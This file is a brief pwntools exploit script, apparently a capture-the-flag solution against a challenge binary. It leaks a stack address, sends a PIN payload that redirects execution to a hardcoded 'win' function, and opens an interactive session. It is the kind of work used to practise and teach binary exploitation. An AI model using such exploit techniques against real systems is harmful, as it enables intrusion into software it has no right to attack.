#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
continue
"""
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.39.so")

exe = "./main"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

sla(b'choice: ', b'2')
stack = int(io.recv(14).decode(), 16)

win = 0x4011F6

payload = flat(
    win,
    b'A' * 0x10,
    stack
    )
sla(b'choice: ', b'1')
sla(b'PIN:', payload)
sla(b'choice: ', b'4')
io.interactive()

